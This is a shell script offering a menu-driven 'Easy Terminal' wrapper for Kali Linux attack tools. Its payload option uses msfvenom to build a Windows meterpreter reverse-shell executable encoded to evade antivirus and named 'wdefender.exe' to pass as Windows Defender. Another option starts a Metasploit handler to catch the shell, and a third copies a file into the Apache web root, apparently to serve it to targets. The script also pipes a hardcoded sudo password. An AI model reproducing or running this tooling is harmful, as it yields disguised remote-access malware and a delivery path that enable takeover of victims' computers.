#!/bin/sh

print_menu() {
    echo "========================================================================="
    figlet "Easy Terminal" | lolcat
    echo " [---] Welcome To Easy Terminal This Tool By Author : [---]"
    figlet "BO7MED MIX YT" | lolcat
    echo "========================================================================="
    echo ""
    echo "============================="
    echo "[1]. Start Metasploit"
    echo "============================="
    echo "[2]. Start Nessus"
    echo "============================="
    echo "[3]. Make Payload"
    echo "============================="
    echo "[4]. Start Apache2"
    echo "============================="
    echo "[5]. Stop Apache2"
    echo "============================="
    echo "[6]. Remove Sys Old Files"
    echo "============================="
    echo "[7]. Update & Upgrade"
    echo "============================="
    echo "[8]. Exit"
    echo "============================="
}

show_ip_addresses() {
    echo "========================================================================="
    echo "IPv4 and IPv6 Addresses"
    echo "========================================================================="
    echo "IPv4 Addresses:"
    ip -4 addr show | grep inet | awk '{print $2}'
    echo ""
    echo "IPv6 Addresses:"
    ip -6 addr show | grep inet6 | awk '{print $2}'
    echo "========================================================================="
}

execute_option() {
    case $1 in
        1)
            xterm -hold -e "
               
                echo '========================================================================='
                echo 'IPv4 and IPv6 Addresses'
                echo '========================================================================='
                echo 'IPv4 Addresses:'
                ip -4 addr show | grep inet | awk '{print \$2}'
                echo ''
                echo 'IPv6 Addresses:'
                ip -6 addr show | grep inet6 | awk '{print \$2}'
                echo '========================================================================='

               
                echo 'Enter LHOST (IP address for Metasploit):'
                read LHOST
                echo 'Enter LPORT (Port for Metasploit):'
                read LPORT
                
                echo 'Your IP address is:'
                echo \$LHOST
                echo 'Starting Metasploit with LHOST=\$LHOST and LPORT=\$LPORT...'

                
                msfconsole -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT \$LPORT; exploit\"
            " &
            ;;
        2)
            echo "Starting Nessus"
            echo "kali" | sudo -S systemctl start nessusd
            clear
            sleep 2
            xdg-open https://localhost:8834
            ;;
        3)
            echo "Creating Payload..."
            read -p "Enter LHOST (IP): " lhost
            read -p "Enter LPORT (Port): " lport
            payload_path="/home/kali/wdefender.exe"
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 5 -o $payload_path
            echo "Payload created successfully!"
            echo "Path to payload: $payload_path"
            echo "LHOST: $lhost"
            echo "LPORT: $lport"
            ;;
        4)
            echo "Starting Apache2 Service..."
            echo "kali" | sudo -S service apache2 start
            echo
            read -p "Enter Location: " Source
            echo
            read -p "Enter Name: " Name
            echo "kali" | sudo -S cp $Source /var/www/html/$Name
            clear
            ;;
        5)
            echo "Stopping Apache2 Service..."
            echo "kali" | sudo -S service apache2 stop
            clear
            ;;
        6)
            echo "Removing old system files..."
            echo "kali" | sudo -S apt autoremove
            clear
            ;;
        7)
            echo "Updating and upgrading system..."
            echo "kali" | sudo -S apt update
            echo "kali" | sudo -S apt upgrade
            ;;
        8)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "Invalid choice. Try Again."
            ;;
    esac
}

while true; do
    clear
    print_menu
    read -p "Choice: " choice
    execute_option $choice
done
